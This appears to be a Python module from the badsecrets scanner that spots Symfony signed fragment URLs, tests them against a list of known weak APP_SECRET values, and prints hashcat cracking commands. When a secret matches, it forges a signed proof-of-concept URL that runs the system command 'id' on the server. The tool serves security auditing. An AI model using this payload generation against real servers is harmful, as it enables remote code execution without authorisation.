import re
import hmac
import base64


from badsecrets.base import BadsecretsBase

# Special thanks to Ambionics Security for their blog post: https://www.ambionics.io/blog/symfony-secret-fragment


class Symfony_SignedURL(BadsecretsBase):
    identify_regex = re.compile(r"http(?:s)?:\/\/[^\/]+\/_fragment[^\s]+_hash=[\/a-zA-z-0-9\+=%]{24,132}")
    description = {"product": "Symfony Signed URL", "secret": "Symfony APP_SECRET", "severity": "CRITICAL"}

    def carve_regex(self):
        return re.compile(r"(http(?:s)?:\/\/[^\/]+\/_fragment[^\s]+_hash=[\/a-zA-z-0-9\+=%]{24,132})")

    def symfonyHMAC(self, url, secret, hash_algorithm):
        return base64.b64encode(hmac.HMAC(secret.encode(), url.encode(), hash_algorithm).digest())

    def symfonyPoC(self, secret, url, hash_algorithm):
        host = url.split("_fragment")[0]
        poc_string = "_fragment?_path=_controller%3Dsystem%26command%3Did%26return_value%3Dnull"
        full_url = f"{host}{poc_string}"
        poc_hash = self.symfonyHMAC(full_url, secret, hash_algorithm)
        poc_url = f"{full_url}&_hash={poc_hash.decode()}"
        return poc_url

    def symfonyVerify(self, value, secret):
        url, url_hash, hash_algorithm = self.symfonyLoad(value)

        generated_hash = self.symfonyHMAC(url, secret, hash_algorithm)
        if generated_hash == url_hash.encode():
            return {
                "hash algorithm": hash_algorithm.__name__.split("openssl_")[1],
                "PoC URL (executes 'id')": self.symfonyPoC(secret, url, hash_algorithm),
            }
        return False

    def symfonyLoad(self, value):
        url, url_hash = value.split("&_hash=")
        for hash_algorithm_str in self.search_dict(self.hash_sizes, len(base64.b64decode(url_hash))):
            hash_algorithm = self.hash_algs[hash_algorithm_str]
        return url, url_hash, hash_algorithm

    def get_hashcat_commands(self, signed_url, *args):
        url, url_hash, hash_algorithm = self.symfonyLoad(signed_url)
        hash_algorithm_str = hash_algorithm.__name__.split("_")[1]
        hashcat_mode = None

        if hash_algorithm_str == "sha1":
            hashcat_mode = "150"

        elif hash_algorithm_str == "sha256":
            hashcat_mode = "1450"

        if hashcat_mode:
            return [
                {
                    "command": f"hashcat -m {hashcat_mode} -a 0 {base64.b64decode(url_hash).hex()}:{url.encode().hex()} --hex-salt  <dictionary_file>",
                    "description": f"Symfony Signed URL Algorithm: [{hash_algorithm_str }]",
                }
            ]

    def check_secret(self, signed_url):
        if not self.identify(signed_url):
            return None
        for l in self.load_resources(["symfony_appsecret.txt"]):
            password = l.rstrip()
            r = self.symfonyVerify(value=signed_url, secret=password)
            if r:
                return {"secret": password, "details": r}
        return None
